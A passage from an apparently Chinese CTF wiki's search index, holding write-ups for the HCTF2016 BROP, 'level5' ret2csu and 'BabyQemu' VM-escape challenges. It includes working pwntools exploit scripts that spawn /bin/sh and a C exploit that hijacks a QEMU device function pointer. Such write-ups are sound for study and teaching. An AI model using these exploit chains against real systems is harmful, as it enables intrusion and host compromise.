2\u3001\u6c42\u51fa\u4e00\u4e2a\u6b63\u5e38\u8fd4\u56de\u5230main\u7684\u51fd\u6570\u4f4d\u7f6e\u3002\uff08\u6765\u5224\u65ad\u4e0b\u9762\u7a77\u4e3e\u65f6\u7684\u4ee3\u7801\uff09\u3002 3\u3001\u56e0\u4e3a__libc_csu_init\u4e00\u822c\u90fd\u4f1a\u7528\u5230\uff0c\u5176\u4e2d\u7684\u901a\u7528gadgets\u5728\u7a0b\u5e8f\u7684\u5176\u4ed6\u4f4d\u7f6e\u4e2d\u4e5f\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u6b64\u4e5f\u5c06\u5176\u4f5c\u4e3a\u731c\u89e3\u7684\u76ee\u6807\u3002\u6c42\u51fa\u901a\u7528gadgets\u7684\u4f4d\u7f6e\u3002 4\u3001\u786e\u5b9aput\u51fd\u6570\u7684\u4f4d\u7f6e\u3002 5\u3001\u5f97\u5230put\u51fd\u6570\u4e4b\u540e\u5c06\u524d\u9762\u7684\u6587\u4ef6dump\u4e0b\u6765\uff0c\u6c42\u51fagot\u8868\u4e2d\u7684\u4f4d\u7f6e\uff0c\u518d\u6c42\u51fa\u52a0\u8f7d\u7684\u5b9e\u9645\u4f4d\u7f6e\u3002 6\u3001\u786e\u5b9alibc\uff0c\u6c42\u51fasystem\u51fd\u6570\u548c/bin/sh\u7684\u4f4d\u7f6e\u3002 7\u3001\u5229\u7528\u3002 ps:\u5982\u679c\u5b58\u5728canary\uff0ccanary\u5728\u7a0b\u5e8f\u91cd\u542f\u540e\u4e0d\u53d8\uff0c\u90a3\u4e48\u53ef\u4ee5\u6309\u5b57\u8282\u5bf9canary\u8fdb\u884c\u7206\u7834\u3002\u6bd4\u5982\u5148\u5c1d\u8bd5\u6539\u53d8\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u7a0b\u5e8f\u4e0d\u80fd\u7ee7\u7eed\u8dd1\u8d77\u6765\uff0c\u5c31\u8bf4\u660e\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0d\u5bf9\uff0c\u5982\u679c\u7a0b\u5e8f\u80fd\u8dd1\u8d77\u6765\uff0c\u5c31\u8bf4\u660e\u7b2c\u4e00\u4e2a\u5b57\u8282\u6b63\u786e\uff0c\u7ee7\u7eed\u8dd1\u4e0b\u4e00\u4e2a\u5b57\u8282","title":"HCTF2016-BROP"},{"location":"pwn/Stackoverflow/brop/#_1","text":"def search_offset(): i = 1 while 1: try: sh = remote( 127.0.0.1 ,9999) sh.recvuntil( WelCome my friend,Do you know password?\\n ) payload = i * a sh.send(payload) output = sh.recv() sh.close() i = i + 1 except Exception: sh.close() return i - 1","title":"\u6c42\u6808\u6ea2\u51fa\u7684\u504f\u79fb"},{"location":"pwn/Stackoverflow/brop/#main","text":"def stop_gadgets(): #addr = 0x4006b2 addr = 0x400000 while 1: try: sh = remote( 127.0.0.1 ,9999) payload = a * 72 payload += p64(addr) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) sh.recv() sh.close() print the addr is :0x%x % (addr) break except Exception: addr = addr + 1 sh.close()","title":"\u6c42\u51fa\u4e00\u4e2a\u53ef\u4ee5\u6b63\u5e38\u8fd4\u56de\u5230main\u51fd\u6570\u7684\u5730\u5740"},{"location":"pwn/Stackoverflow/brop/#gadgetsmaingadget","text":"def find_brop_gadgets(): addr = 0x4007b0 while 1: try: sh = remote( 127.0.0.1 ,9999) payload = a * 72 payload += p64(addr) payload += p64(1) * 6 payload += p64(stop_gadget) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) sh.recv() sh.close() print the addr is :0x%x % (addr) return addr except Exception: addr = addr + 1 sh.close() def check_brop_gadgets(): print hex(addr) try: sh = remote( 127.0.0.1 ,9999) payload = a * 72 payload += p64(addr) + p64(1)*7 sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) sh.recv() sh.close() print false except Exception: print true","title":"\u6c42\u51fa\u901a\u7528gadgets\u7684\u4f4d\u7f6e\uff0c\u4e3a\u4e86\u4e0e\u8fd4\u56de\u5230main\u51fd\u6570\u7684gadget\u4f5c\u533a\u5206\uff0c\u8fd8\u8981\u505a\u4e00\u4e2a\u5224\u65ad"},{"location":"pwn/Stackoverflow/brop/#putplt","text":"def find_put_plt(): addr = 0x400550 while 1: try: payload = 72 * a payload += p64(brop_gadget+9) payload += p64(0x400000) payload += p64(addr) payload += p64(stop_gadget) sh = remote( 127.0.0.1 ,9999) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) output = sh.recv() sh.close() if output.startswith( \\x7fELF ): print the addr is :0x%x % (addr) return addr else: addr = addr + 1 except Exception: sh.close() addr = addr + 1 \u8fd9\u91cc\u5b58\u5728\u4e24\u4e2a\u77e5\u8bc6\u70b9\u3002 1\u3001\u6307\u5411 pop r15\u7684\u5730\u5740\u518d\u5f80\u540e\u4e00\u4e2a\u5b57\u8282\u5c31\u53ef\u4ee5\u53d8\u6210 pop rdi \u5177\u4f53\u53ef\u4ee5\u770b\u4e00\u4e0b\u4e24\u6761\u6c47\u7f16\u6307\u4ee4\u7684\u673a\u5668\u7801 pop r15 \u5728brop_gadgets+8\u5904\uff0c\u56e0\u6b64 pop rdi\u5728brop_gadgets+9\u5904 \u540c\u7406\u4e5f\u53ef\u4ee5\u63a7\u5236rsi 2\u3001\u6c42\u51fa\u6765\u7684put\u5730\u5740\u662f 0x400555\uff0c\u4f46\u5176\u5b9eput\u51fd\u6570\u5728plt\u4e2d\u7684\u5b9e\u9645\u4f4d\u7f6e\u662f0x400560\uff0c\u5f53\u7136\u4f7f\u7528\u6c42\u51fa\u6765\u7684\u5730\u5740\u4e5f\u65e0\u6240\u8c13","title":"\u786e\u5b9aput\u51fd\u6570\u5728plt\u4e2d\u7684\u4f4d\u7f6e"},{"location":"pwn/Stackoverflow/brop/#putdumpputgot","text":"def leak(): addr = 0x400000 result = while (addr 0x400700): payload = 72 * a payload += p64(brop_gadget+9) payload += p64(addr) payload += p64(put_gadget) payload += p64(stop_gadget) sh = remote( 127.0.0.1 ,9999) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.send(payload) try: data = sh.recv() sh.close() try: data = data[:data.index( \\nWelCome )] except Exception: data = data if (data == ): data = \\x00 except Exception: sh.close() continue; result += data addr = addr + len(data) with open( leak_code , wb ) as f: f.write(result) print success \u5229\u7528ida\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5f97\u5230\u5730\u5740 \u53ef\u4ee5\u770b\u5230 put\u5728got\u8868\u4e2d\u7684\u5730\u5740\u4e3a0x601018 \u7136\u540e\u627e\u5230\u5bf9\u5e94\u7684libc\u5e93 \uff0c\u5229\u7528\u504f\u79fb\u627e\u5230\u771f\u6b63\u7684system\u5730\u5740\u548c/bin/sh\u5730\u5740\uff0c\u5728\u8fdb\u884c\u5229\u7528 sys_addr = 0 bin_addr = 0 offset = 72 brop_gadget = 0x4007ba stop_gadget = 0x4006b6 put_gadget = 0x400555 put_got = 0x601018 payload = a * 72 payload += p64(brop_gadget+9) payload += p64(put_got) payload += p64(put_gadget) payload += p64(stop_gadget) sh = remote( 127.0.0.1 ,9999) sh.recvuntil( password?\\n ) sh.sendline(payload) data = sh.recv() put_addr = u64(data.ljust(8, \\x00 )) libc = LibcSearcher( puts ,put_addr) libc_base = put_addr - libc.dump( puts ) sys_addr = libc_base + libc.dump( system ) bin_addr = libc_base + libc.dump( str_bin_sh ) #addr = find_brop_gadgets() payload = a * 72 payload += p64(brop_gadget+9) payload += p64(bin_addr) payload += p64(sys_addr) payload += p64(stop_gadget) sh.recvuntil( password?\\n ) sh.sendline(payload) sh.interactive()","title":"\u5229\u7528put\u51fd\u6570\u628a\u4e8c\u8fdb\u5236\u6587\u4ef6dump\u4e0b\u6765\uff0c\u4ece\u800c\u627e\u5230put\u51fd\u6570\u5728got\u8868\u4e2d\u7684\u5730\u5740"},{"location":"pwn/Stackoverflow/level5/","text":"level5\uff08ctf-wiki\uff09 __libc_csu_init\u51fd\u6570\u4f1a\u5bf9libc\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u627e\u4e0d\u5230\u5408\u9002\u7684\u4e0e\u5bc4\u5b58\u5668\u76f8\u5173\u7684gadgets\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece __libc_csu_init\u5165\u624b\u5bfb\u627egadgets \u9996\u5148\u4f7f\u7528objdump\u89c2\u5bdf__libc_csu_init \u8fd0\u884c\u4e00\u4e0b\u7a0b\u5e8f \u53d1\u73b0\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8f93\u5165\u7a0b\u5e8f \u8c03\u7528\u4e86read\u51fd\u6570\u8bfb\u53d6\u8f93\u5165 \u90a3\u4e48\u9996\u5148\u5229\u7528pattern\u627e\u5230\u6ea2\u51fa\u70b9 \u7a0b\u5e8f\u4e2d\u6ca1\u6709system\u51fd\u6570\u548c\\bin\\sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7\u8f93\u5165\u7684\u65b9\u5f0f\u8fdb\u884c\u6784\u9020 \u5229\u7528\u7684\u56db\u4e2a\u6b65\u9aa4\uff1a 1\u3001\u901a\u8fc7\u6ea2\u51fa\u6267\u884cwrite\u51fd\u6570\u6cc4\u9732\u51fawrite\u51fd\u6570\u672c\u8eab\u7684\u5730\u5740\uff0c\u518d\u8df3\u56de\u5230main\u51fd\u6570\u4e2d\u7ee7\u7eed\u6267\u884c\u3002 2\u3001\u5229\u7528write\u51fd\u6570\u7684\u5730\u5740\u786e\u5b9a\u5bf9\u5e94\u7684libc\u7248\u672c\uff0c\u7136\u540e\u7b97\u51faexecve\u7684\u4f4d\u7f6e\u3002 3\u3001\u901a\u8fc7\u6ea2\u51fa\u6267\u884cread\u51fd\u6570\uff0c\u5c06execve\u4e0e\u5173\u952e\u5b57\u7b26\u4e32\u5199\u5165\u5230bss\u6bb5\u4e2d\uff0c\u518d\u8df3\u56de\u5230main\u51fd\u6570\u7ee7\u7eed\u6267\u884c\u3002 4\u3001\u901a\u8fc7\u6ea2\u51fa\u6267\u884cbss\u6bb5\u5185\u7684execve\u51fd\u6570\u3002 \u9700\u8981\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9 1\u300164\u4f4d\u7a0b\u5e8f\u7684\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u3002%rdi\uff0c%rsi\uff0c%rdx\uff0c%rcx\uff0c%r8\uff0c%r9 \u7528\u4f5c\u51fd\u6570\u53c2\u6570\uff0c\u4f9d\u6b21\u5bf9\u5e94\u7b2c1\u53c2\u6570\uff0c\u7b2c2\u53c2\u6570\u3002\u3002\u3002 2\u3001read\u51fd\u6570\u53ef\u4ee5\u8fdb\u884c\u8f93\u5165\uff0cwrite\u51fd\u6570\u53ef\u4ee5\u8fdb\u884c\u8f93\u51fa\uff0cfd=0\u4e3a\u6807\u51c6\u8f93\u5165\uff0cdf=1\u4e3a\u6807\u51c6\u8f93\u51fa\u3002 \u5b8c\u6574\u4ee3\u7801 from pwn import * from LibcSearcher import * context.terminal = [ gnome-terminal , -x , sh , -c ] level5 = ELF( ./level5 ) sh = process( ./level5 ) bss_base = level5.bss() write_got = level5.got[ write ] read_got = level5.got[ read ] main_addr = level5.symbols[ main ] csu_mov_addr = 0x0000000000400600 # mov rdx, r13 ;mov rsi, r14 ;mov edi, r15d ;call qword ptr [r12+rbx*8];add rbx, 1;cmp rbx, rbp;jnz hort loc_400600; csu_pop_addr = 0x000000000040061A #pop rbx; pop rbp;pop r12;pop r13;pop r14;pop r15; payload1 = a * 136 payload1 += p64(csu_pop_addr) + p64(0) +p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) payload1 += p64(csu_mov_addr) payload1 += a * 56 payload1 += p64(main_addr) sh.recvuntil( Hello, World\\n ) sh.send(payload1) sleep(1) write_addr = u64(sh.recv(8)) print hex(write_addr) libc = LibcSearcher( write ,write_addr) libc_base = write_addr - libc.dump( write ) execve_addr = libc_base + libc.dump( execve ) print hex(execve_addr) payload2 = a * 136 payload2 += p64(csu_pop_addr) + p64(0) +p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload2 += p64(csu_mov_addr) payload2 += a * 56 payload2 += p64(main_addr) sh.send(payload2) payload3 = p64(execve_addr) + /bin/sh\\x00 sh.send(payload3) sh.recvuntil( Hello, World\\n ) payload4 = a * 136 payload4 += p64(csu_pop_addr) + p64(0) +p64(1) + p64(bss_base) + p64(0) + p64(0) + p64(bss_base+8) payload4 += p64(csu_mov_addr) payload4 += a * 56 payload4 += p64(main_addr) sh.send(payload4) sh.interactive()","title":"level5"},{"location":"pwn/Stackoverflow/level5/#level5ctf-wiki","text":"__libc_csu_init\u51fd\u6570\u4f1a\u5bf9libc\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u627e\u4e0d\u5230\u5408\u9002\u7684\u4e0e\u5bc4\u5b58\u5668\u76f8\u5173\u7684gadgets\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece __libc_csu_init\u5165\u624b\u5bfb\u627egadgets \u9996\u5148\u4f7f\u7528objdump\u89c2\u5bdf__libc_csu_init \u8fd0\u884c\u4e00\u4e0b\u7a0b\u5e8f \u53d1\u73b0\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8f93\u5165\u7a0b\u5e8f \u8c03\u7528\u4e86read\u51fd\u6570\u8bfb\u53d6\u8f93\u5165 \u90a3\u4e48\u9996\u5148\u5229\u7528pattern\u627e\u5230\u6ea2\u51fa\u70b9 \u7a0b\u5e8f\u4e2d\u6ca1\u6709system\u51fd\u6570\u548c\\bin\\sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7\u8f93\u5165\u7684\u65b9\u5f0f\u8fdb\u884c\u6784\u9020 \u5229\u7528\u7684\u56db\u4e2a\u6b65\u9aa4\uff1a 1\u3001\u901a\u8fc7\u6ea2\u51fa\u6267\u884cwrite\u51fd\u6570\u6cc4\u9732\u51fawrite\u51fd\u6570\u672c\u8eab\u7684\u5730\u5740\uff0c\u518d\u8df3\u56de\u5230main\u51fd\u6570\u4e2d\u7ee7\u7eed\u6267\u884c\u3002 2\u3001\u5229\u7528write\u51fd\u6570\u7684\u5730\u5740\u786e\u5b9a\u5bf9\u5e94\u7684libc\u7248\u672c\uff0c\u7136\u540e\u7b97\u51faexecve\u7684\u4f4d\u7f6e\u3002 3\u3001\u901a\u8fc7\u6ea2\u51fa\u6267\u884cread\u51fd\u6570\uff0c\u5c06execve\u4e0e\u5173\u952e\u5b57\u7b26\u4e32\u5199\u5165\u5230bss\u6bb5\u4e2d\uff0c\u518d\u8df3\u56de\u5230main\u51fd\u6570\u7ee7\u7eed\u6267\u884c\u3002 4\u3001\u901a\u8fc7\u6ea2\u51fa\u6267\u884cbss\u6bb5\u5185\u7684execve\u51fd\u6570\u3002 \u9700\u8981\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9 1\u300164\u4f4d\u7a0b\u5e8f\u7684\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u3002%rdi\uff0c%rsi\uff0c%rdx\uff0c%rcx\uff0c%r8\uff0c%r9 \u7528\u4f5c\u51fd\u6570\u53c2\u6570\uff0c\u4f9d\u6b21\u5bf9\u5e94\u7b2c1\u53c2\u6570\uff0c\u7b2c2\u53c2\u6570\u3002\u3002\u3002 2\u3001read\u51fd\u6570\u53ef\u4ee5\u8fdb\u884c\u8f93\u5165\uff0cwrite\u51fd\u6570\u53ef\u4ee5\u8fdb\u884c\u8f93\u51fa\uff0cfd=0\u4e3a\u6807\u51c6\u8f93\u5165\uff0cdf=1\u4e3a\u6807\u51c6\u8f93\u51fa\u3002 \u5b8c\u6574\u4ee3\u7801 from pwn import * from LibcSearcher import * context.terminal = [ gnome-terminal , -x , sh , -c ] level5 = ELF( ./level5 ) sh = process( ./level5 ) bss_base = level5.bss() write_got = level5.got[ write ] read_got = level5.got[ read ] main_addr = level5.symbols[ main ] csu_mov_addr = 0x0000000000400600 # mov rdx, r13 ;mov rsi, r14 ;mov edi, r15d ;call qword ptr [r12+rbx*8];add rbx, 1;cmp rbx, rbp;jnz hort loc_400600; csu_pop_addr = 0x000000000040061A #pop rbx; pop rbp;pop r12;pop r13;pop r14;pop r15; payload1 = a * 136 payload1 += p64(csu_pop_addr) + p64(0) +p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) payload1 += p64(csu_mov_addr) payload1 += a * 56 payload1 += p64(main_addr) sh.recvuntil( Hello, World\\n ) sh.send(payload1) sleep(1) write_addr = u64(sh.recv(8)) print hex(write_addr) libc = LibcSearcher( write ,write_addr) libc_base = write_addr - libc.dump( write ) execve_addr = libc_base + libc.dump( execve ) print hex(execve_addr) payload2 = a * 136 payload2 += p64(csu_pop_addr) + p64(0) +p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload2 += p64(csu_mov_addr) payload2 += a * 56 payload2 += p64(main_addr) sh.send(payload2) payload3 = p64(execve_addr) + /bin/sh\\x00 sh.send(payload3) sh.recvuntil( Hello, World\\n ) payload4 = a * 136 payload4 += p64(csu_pop_addr) + p64(0) +p64(1) + p64(bss_base) + p64(0) + p64(0) + p64(bss_base+8) payload4 += p64(csu_mov_addr) payload4 += a * 56 payload4 += p64(main_addr) sh.send(payload4) sh.interactive()","title":"level5\uff08ctf-wiki\uff09"},{"location":"pwn/VMEscape/BabyQemu/","text":"babyqemu Base knowledge can be found in QOM module analysis, etc. Analysis Launch cmd is shown here. ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append console=ttyS0 root=/dev/ram oops=panic panic=1 \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id = vda In the qemu pci device mmio write callback function hitb_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size) else if ( addr == 0x98 val 1 ! ( opaque - dma . cmd 1 ) ) { opaque - dma . cmd = val ; v7 = qemu_clock_get_ns ( QEMU_CLOCK_VIRTUAL_0 ); timer_mod ( opaque - dma_timer , (( signed __int64 )(( unsigned __int128 )( 0x431BDE82D7B634DBLL * ( signed __int128 ) v7 ) 64 ) 18 ) - ( v7 63 ) + 100 ); } It means we can set *((_QWORD *)opaque + 0x170) to the value we want. And in the function hitb_mmio_write , if we set this QWORD value, we can trigger some cpu_physical_memory_rw operation. if ( v1 2 ) { v2 = ( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 ); if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } cpu_physical_memory_rw ( opaque - dma . dst , v3 , opaque - dma . cnt , 1 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } The parameters of cpu_physical_memory_rw is defined as void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write); . So - opaque- dma.dst is the address if ( addr == 0x80 ) { if ( ! ( opaque - dma . cmd 1 ) ) opaque - dma . src = val ; } - v7 = (uint8_t *) opaque- dma_buf[v2]; is the buf - opaque- dma.cnt is the length //hitb_dma_timer if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } - opaque- dma.cmd means read or write operation cpu_physical_memory_rw is the original qemu function. void cpu_physical_memory_rw ( hwaddr addr , uint8_t * buf , int len , int is_write ) { address_space_rw ( address_space_memory , addr , MEMTXATTRS_UNSPECIFIED , buf , len , is_write ); } vulnerability OOB Write We can find the call operation for cpu_physical_memory_rw here. if ( v1 2 ) { v2 = (unsigned int)(LODWORD(opaque- dma.src) - 0x40000); if ( v1 4 ) { v7 = (uint8_t *) opaque- dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque- enc)(v7, LODWORD(opaque- dma.cnt)); v3 = v7; } else { v3 = (uint8_t *) opaque- dma_buf[v2]; } cpu_physical_memory_rw(opaque- dma.dst, v3, opaque- dma.cnt, 1); v4 = opaque- dma.cmd; v5 = opaque- dma.cmd 4; } This call process is shown as follows, which aims to do WRITE to the real virtual memory belonging to QEMU PROCESS by translating GUEST PADDR to HOST PROCESS VADDR. cpu_physical_memory_rw ( opaque - dma . dst , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , 1 ); address_space_rw ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , is_write != 0 ); address_space_write ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt ) v10 = address_space_translate ( address_space_memory , opaque - dma . dst , addr1 , l //l = opaque- dma.cnt, 1 ); v14 = qemu_map_ram_ptr ( v10 - ram_block , v27 ); //v27 == addr1 memcpy ( v14 , v5 , n ); // do memcpy operation So, we can copy an OOB READ memory to our process's physical address (opaque- dma.dst). LEAK CAN BE DONE THROUGH THIS VULN. OOB WRITE We can find the call operation for cpu_physical_memory_rw here, too. else { v6 = ( uint8_t * ) opaque [ 0xFFFFFFDBLL ]. dma_buf [( unsigned int ) opaque - dma . dst + 0x510 ]; LODWORD ( v3 ) = ( _DWORD ) opaque + opaque - dma . dst - 0x40000 + 0xBB8 ; /* ASM can be more explicit here .text:0000000000284120 mov rax, [rdi+0B70h] ; HitbState.dst .text:0000000000284127 mov edx, [hitb+0B78h] ; len .text:000000000028412D xor ecx, ecx ; is_write .text:000000000028412F sub eax, 40000h .text:0000000000284134 lea rbp, [rdi+rax+0BB8h] .text:000000000028413C mov rdi, [rdi+0B68h] ; addr .text:0000000000284143 mov rsi, rbp ; buf .text:0000000000284146 call cpu_physical_memory_rw */ cpu_physical_memory_rw ( opaque - dma . src , v6 , opaque - dma . cnt , 0 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; if ( opaque - dma . cmd 4 ) { v3 = ( uint8_t * ) LODWORD ( opaque - dma . cnt ); (( void ( __fastcall * )( uint8_t * , uint8_t * , dma_addr_t )) opaque - enc )( v6 , v3 , v5 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } } opaque - dma . cmd = v4 0xFFFFFFFFFFFFFFFELL ; if ( v5 ) { opaque - irq_status |= 0x100u ; hitb_raise_irq ( opaque , ( uint32_t ) v3 ); } So, the parameter v6 of cpu_physical_memory_rw can make the read destination out of boundry. We can use it to overwrite the opaque- enc function pointer. And, opaque- dma.src will be translated from GUEST PADDR to HOST VADDR . So, we just need to set a paddr belonging to our process to set the source of this COPY operation. exploit #include stdio.h #include stdlib.h #include stdint.h #include unistd.h #include string.h #include errno.h #include signal.h #include fcntl.h #include ctype.h #include termios.h #include sys/types.h #include sys/mman.h #include assert.h #define PRINT_ERROR \\ do { \\ fprintf(stderr, Error at line %d, file %s (%d) [%s]\\n , \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) #define MAP_SIZE 4096UL #define MAP_MASK (MAP_SIZE - 1) int fd = - 1 ; char * filename = /sys/devices/pci0000:00/0000:00:04.0/resource0 ; //not used~ void pcimem_read ( uint64_t target , char access_type , uint64_t * read_result ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); void * virt_addr = map_base + ( target MAP_MASK ); int type_width = 0 ; switch ( access_type ) { case b : * read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } printf ( Value at offset 0x%X (%p): 0x%0*lX \\n , ( int ) target , virt_addr , type_width * 2 , * read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } void pcimem_write ( uint64_t target , char access_type , uint64_t writeval ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); uint64_t read_result = 0 ; int type_width = 0 ; void * virt_addr = map_base + ( target MAP_MASK ); switch ( access_type ) { case b : * (( uint8_t * ) virt_addr ) = writeval ; read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * (( uint16_t * ) virt_addr ) = writeval ; read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * (( uint32_t * ) virt_addr ) = writeval ; read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * (( uint64_t * ) virt_addr ) = writeval ; read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } //readback not correct? printf ( Written 0x%0*lX; readback 0x%*lX \\n , type_width , writeval , type_width , read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment assert (( virt 0xfff ) == 0 ); int fd = open ( /proc/self/pagemap , O_RDONLY ); if ( fd == - 1 ) PRINT_ERROR ; uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , phys , 8 ) != 8 ) PRINT_ERROR ; // Assert page present assert ( phys ( 1ULL 63 )); phys = ( phys (( 1ULL 54 ) - 1 )) * 0x1000 ; return phys ; } int main () { if (( fd = open ( filename , O_RDWR | O_SYNC )) == - 1 ) PRINT_ERROR ; //for dma read and write void * dma_addr = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , - 1 , 0 ); if ( dma_addr == ( void * ) - 1 ) PRINT_ERROR ; // lock the dma_addr from hw mem mlock ( dma_addr , 0x1000 ); void * dma_phy_addr = ( void * ) virt2phys ( dma_addr ); //Step 1 // leak code base //set dma.src pcimem_write ( 0x80 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set dma.dst pcimem_write ( 0x88 , d , ( uint64_t ) dma_phy_addr ); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd to write pcimem_write ( 0x98 , d , 2 | 1 ); //wait for timer being triggered. sleep ( 1 ); uint64_t enc_address = * ( uint64_t * ) dma_addr ; printf ( enc_address (host vaddr) -- 0x%016lx \\n , enc_address ); uint64_t code_base = enc_address - 0x283DD0 ; uint64_t system_addr = code_base + 0x1FDB18 ; * ( uint64_t * ) dma_addr = system_addr ; //Step 2 //overwrite function pointer //set dma.src pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr ); //set dma.dst //.text:0000000000284120 mov rax, [rdi+0B70h] ; dst //.text:0000000000284127 mov edx, [hitb+0B78h] ; len //.text:000000000028412D xor ecx, ecx ; is_write //.text:000000000028412F sub eax, 40000h //.text:0000000000284134 lea rbp, [rdi+rax+0BB8h] //.text:000000000028413C mov rdi, [rdi+0B68h] ; addr //.text:0000000000284143 mov rsi, rbp ; buf //.text:0000000000284146 call cpu_physical_memory_rw pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 ); sleep ( 1 ); //Step3 //prepare a parameter for system and trigger it strcpy (( char * )( dma_addr ) + 0x10 , deepin-calculator ); //set dma.src to the paddr of dma pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr + 0x10 ); //set dma.dst to the buf of device Hitb pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 )); //set cnt pcimem_write ( 0x90 , d , 18 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 | 4 ); sleep ( 1 ); return 0 ; }","title":"BabyQemu"},{"location":"pwn/VMEscape/BabyQemu/#babyqemu","text":"Base knowledge can be found in QOM module analysis, etc.","title":"babyqemu"},{"location":"pwn/VMEscape/BabyQemu/#analysis","text":"Launch cmd is shown here. ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append console=ttyS0 root=/dev/ram oops=panic panic=1 \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id = vda In the qemu pci device mmio write callback function hitb_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size) else if ( addr == 0x98 val 1 ! ( opaque - dma . cmd 1 ) ) { opaque - dma . cmd = val ; v7 = qemu_clock_get_ns ( 